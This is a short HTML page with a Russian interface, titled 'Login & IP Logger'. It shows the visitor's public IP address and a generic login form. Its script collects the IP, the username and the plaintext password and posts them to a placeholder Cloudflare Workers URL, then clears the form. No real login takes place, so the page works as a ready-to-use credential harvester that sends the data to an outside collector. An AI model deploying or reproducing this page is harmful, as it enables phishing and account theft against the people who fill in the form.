<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login & IP Logger</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px;
    }
    .box {
      background: white;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 360px;
      margin-bottom: 20px;
      text-align: center;
    }
    form input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    form button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      border: none;
      color: #fff;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
    }
    h2 { margin-bottom: 10px; }
    #ip { font-size: 1.2em; color: #333; }
  </style>
</head>
<body>

  <div class="box">
    <h2>Ваш IP-адрес</h2>
    <p id="ip">Загрузка…</p>
  </div>

  <div class="box">
    <h2>Войти в систему</h2>
    <form id="loginForm">
      <input type="text"    name="login"    placeholder="Login"    required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const WORKER_URL = 'https://<YOUR_WORKER_SUBDOMAIN>.workers.dev/'; // ← вставьте свой URL

    // 1) Получаем публичный IPv4
    async function fetchIP() {
      try {
        const res  = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        document.getElementById('ip').textContent = json.ip;
      } catch {
        document.getElementById('ip').textContent = 'Ошибка загрузки IP';
      }
    }
    fetchIP();

    // 2) При отправке формы шлём IP + данные в Worker
    document.getElementById('loginForm').addEventListener('submit', async e => {
      e.preventDefault();
      const form = e.target;
      const payload = {
        ip:       document.getElementById('ip').textContent,
        login:    form.login.value,
        password: form.password.value
      };

      try {
        await fetch(WORKER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        alert('Данные отправлены!');
        form.reset();
      } catch (err) {
        console.error(err);
        alert('Ошибка отправки');
      }
    });
  </script>

</body>
</html>
